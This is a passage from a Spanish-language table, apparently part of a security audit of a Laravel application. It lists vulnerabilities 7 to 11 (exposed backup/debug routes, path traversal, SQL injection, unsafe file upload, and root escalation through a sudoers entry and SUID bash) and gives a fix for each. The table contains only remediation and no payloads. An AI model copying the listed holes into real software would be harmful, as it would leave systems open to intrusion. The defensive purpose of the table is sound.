| 7 | Exposición Info | A05 | routes/web.php | Proteger `/backup`, `/debug` con `auth` + check admin |
| 8 | Path Traversal | A01/A05 | AdminController.php | `realpath()` + whitelist de directorio |
| 9 | SQL Injection | A03 | AdminController.php | Bindings con `?` en `DB::select()` |
| 10 | File Upload | A04/A05 | AdminController.php | Validar `mimes:`, nombre aleatorio; nginx bloquea `.php` en avatars |
| 11 | Privesc root | A06 | Dockerfile | Eliminar entrada sudoers y SUID bash |
